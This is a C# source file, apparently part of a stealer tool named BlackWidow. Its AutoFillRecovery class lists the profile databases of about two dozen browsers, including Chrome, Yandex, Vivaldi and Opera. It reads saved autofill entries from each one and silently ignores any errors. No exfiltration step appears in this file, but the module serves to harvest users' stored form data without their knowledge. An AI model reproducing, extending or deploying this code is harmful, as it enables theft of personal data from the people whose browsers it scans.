using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackWidow.AutoFills
{
    class AutoFillRecovery
    {
        public static List<AutoFill> GetAutoFill()
        {
            List<AutoFill> autoFill = new List<AutoFill>();

            string[] pathBrowser =
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Comodo\\Dragon\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Cookies"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Orbitum\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Torch\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Kometa\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Amigo\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Vivaldi\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Nichrome\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Maxthon5\\Users\\guest\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Epic Privacy Browser\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "CocCoc\\Browser\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "360Browser\\Browser\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Sputnik\\Sputnik\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "uCozMedia\\Uran\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "CentBrowser\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "7Star\\7Star\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Elements Browser\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Superbird\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Chedot\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Suhba\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Rafotech\\Mustang\\User Data\\Default\\Web Data"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Opera Software\\Opera Neon\\User Data\\Default\\Web Data")
            };

            for (int i = 0; i < pathBrowser.Length; i++)
            {
                List<AutoFill> autoFills = new List<AutoFill>();
                try
                {
                    autoFills = AutoFillBase.GetAutoFill(pathBrowser[i]);
                }
                catch
                {
                }

                if (autoFills != null)
                {
                    autoFill.AddRange(autoFills);
                }
            }

            return autoFill;
        }
    }
}
